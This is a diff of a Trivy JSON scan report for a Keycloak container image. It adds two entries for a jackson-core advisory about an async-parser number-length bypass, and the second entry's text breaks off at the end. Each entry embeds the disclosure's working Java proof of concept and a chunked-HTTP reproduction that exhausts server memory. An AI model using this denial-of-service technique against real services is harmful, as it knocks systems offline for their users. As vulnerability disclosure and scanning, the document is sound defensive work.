@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.72.0"
   },
-  "ReportID": "019f833d-5ab7-77a8-936c-d67087061967",
-  "CreatedAt": "2026-07-21T05:54:24.055503521Z",
+  "ReportID": "019f8862-776a-7d84-b306-972be027e92e",
+  "CreatedAt": "2026-07-22T05:53:02.314887371Z",
   "ArtifactID": "sha256:522822054452e998f6ce7d8ba1d682e6cb00bc1059eb392ea3bc0bcfea27b0d1",
   "ArtifactName": "quay.io/keycloak/keycloak:26.7.0",
   "ArtifactType": "container_image",
@@ -34877,6 +34877,98 @@
       ],
       "Vulnerabilities": [
         {
+          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgPath": "opt/keycloak/bin/client/keycloak-admin-cli-26.7.0.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.2",
+            "UID": "f2a6d1a1dbdb0a48"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.8, 2.21.4, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:6a3c3e74ff9dace9b98b4d5d1f99076899f2eecdc3a4880b080057ec75b15977",
+          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
+            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
+            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
+            "https://github.com/FasterXML/jackson-core/pull/1611",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+          ],
+          "PublishedDate": "2026-07-21T21:58:53Z",
+          "LastModifiedDate": "2026-07-21T21:58:53Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgPath": "opt/keycloak/lib/lib/main/com.fasterxml.jackson.core.jackson-core-2.21.2.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.2",
+            "UID": "36781d396129be4f"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.8, 2.21.4, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:6a3c3e74ff9dace9b98b4d5d1f99076899f2eecdc3a4880b080057ec75b15977",
+          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr \u003e= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr \u003e= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // \u003c-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr \u003e= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // \u003c-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) \u0026 0xFF;\n        if (ch \u003c INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch \u003e INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // \u003c-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // \u003c-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch \u003e= INT_0 \u0026\u0026 ch \u003c= INT_9) {\n        ++fractLen;\n        if (outPtr \u003e= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr \u003e= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // \u003c-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc \u0026\u0026 cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat \u003e PoC.java \u003c\u003c'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i \u003c digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c \u003c 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux\u003cDataBuffer\u003e` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux\u003c...\u003e` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       \u003c- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     \u003c- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises 